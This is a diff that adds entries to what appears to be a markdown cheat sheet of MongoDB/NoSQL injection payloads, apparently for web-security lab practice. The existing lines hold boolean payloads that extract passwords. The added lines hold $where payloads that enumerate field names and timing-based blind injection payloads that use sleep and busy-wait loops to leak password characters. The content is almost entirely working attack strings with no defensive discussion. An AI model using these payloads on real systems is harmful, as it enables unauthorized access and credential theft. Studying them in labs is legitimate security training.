@@ -42,3 +42,16 @@ admin' && this.password.length == 10 || 'a'=='b
 admin' && this.password.match(/\d/) || 'a'=='b
 admin' && this.password[0] == 'a' || 'a'=='b
 ```
+## Extracting field names
+```
+{"username":"wiener","password":"peter", "$where":"0"}
+{"username":"wiener","password":"peter", "$where":"1"}
+"$where":"Object.keys(this)[0].match('^.{0}a.*')"
+```
+
+# Timing based injection
+```
+ {"$where": "sleep(5000)"
+admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
+```
